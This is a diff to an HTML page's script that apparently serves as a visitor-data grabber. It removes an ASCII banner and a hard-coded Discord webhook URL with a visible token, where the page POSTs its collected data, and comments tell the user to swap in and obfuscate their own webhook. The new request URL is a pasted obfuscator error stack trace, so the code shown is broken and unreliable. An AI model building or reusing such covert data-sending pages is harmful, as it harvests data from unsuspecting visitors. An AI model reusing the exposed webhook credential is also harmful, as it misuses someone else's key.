@@ -8,12 +8,6 @@
   <body>
     <div id="wrapper"></div>
     <script>
-//██╗░█████╗░███████╗██████╗░███████╗░█████╗░██████╗░
-//██║██╔══██╗██╔════╝██╔══██╗██╔════╝██╔══██╗██╔══██╗
-//██║██║░░╚═╝█████╗░░██████╦╝█████╗░░███████║██████╔╝
-//██║██║░░██╗██╔══╝░░██╔══██╗██╔══╝░░██╔══██║██╔══██╗
-//██║╚█████╔╝███████╗██████╦╝███████╗██║░░██║██║░░██║
-//╚═╝░╚════╝░╚══════╝╚═════╝░╚══════╝╚═╝░░╚═╝╚═╝░░╚═╝
 function json(url) {
   return fetch(url).then(res => res.json());
 }
@@ -36,7 +30,12 @@ var codeBlock = '<center><div class="content">' +
                 '</div></center>';
 document.getElementById("wrapper").innerHTML = codeBlock
 var request = new XMLHttpRequest();
-request.open("POST", "https://discord.com/api/webhooks/919331283220463668/sKoYvVzE-ai5UXDTL2ysdmkRgzGVUTdQYL-I_wUrkm3lXNCddNzC68Q4t95hsp5l7lId");
+request.open("POST", "System.NullReferenceException: Object reference not set to an instance of an object.
+   at JScriptCodeDom.CodeLabelStatement.WriteStatementCode(CodeWriter writer)
+   at JScriptCodeDom.CodeBlock.WriteCode(CodeWriter writer, Boolean blockquote)
+   at ProtectorV1.Protect(String[] codes)
+   at ProtectorV1.Protect(String code)
+   at ASP.javascript_obfuscator_aspx.Button1_Click(Object sender, EventArgs e)");
 //Obfuscate your webhook at https://javascriptobfuscator.com/
 // again, replace the webhook in the open method with yours
 request.setRequestHeader('Content-type', 'application/json');
